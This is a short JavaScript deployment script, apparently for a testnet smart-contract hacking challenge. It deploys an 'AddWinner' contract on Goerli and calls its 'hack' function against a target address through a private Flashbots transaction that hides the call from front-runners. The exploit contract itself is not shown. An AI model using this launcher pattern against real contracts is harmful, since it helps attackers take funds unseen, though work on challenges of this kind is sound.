const { BigNumber, providers, Wallet, ethers } = require("ethers");
const {
    FlashbotsBundleProvider,
} = require("@flashbots/ethers-provider-bundle");

const provider = providers.getDefaultProvider("goerli");
const FLASHBOTS_EP = "https://relay-goerli.flashbots.net/";

const AddWinner = artifacts.require("AddWinner");

const { MNEMONIC, TARGET_CONTRACT_ADDR } = process.env;

module.exports = async function (deployer) {
    // Deploying AddWinner Contract
    await deployer.deploy(AddWinner);
    const addWinnerInstance = await AddWinner.deployed(AddWinner);

    // Now sending a private transaction to call the hack function of AddWinner Contract
    const mnemonicWallet = Wallet.fromMnemonic(MNEMONIC);
    const wallet = new Wallet(mnemonicWallet.privateKey || "", provider);

    let ABI = ["function hack(address target)"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("hack", [TARGET_CONTRACT_ADDR]);

    const authSigner = Wallet.createRandom();
    const flashbotsProvider = await FlashbotsBundleProvider.create(
        provider,
        authSigner,
        FLASHBOTS_EP,
        "goerli",
    );

    const tx = {
        from: wallet.address,
        to: addWinnerInstance.address,
        gasPrice: BigNumber.from(99).mul(1e9),
        gasLimit: BigNumber.from(116714),
        data: data,
        nonce: await provider.getTransactionCount(wallet.address),
    };

    const privateTx = {
        transaction: tx,
        signer: wallet,
    };

    const res = await flashbotsProvider.sendPrivateTransaction(privateTx);

    console.log(await res.simulate());
};
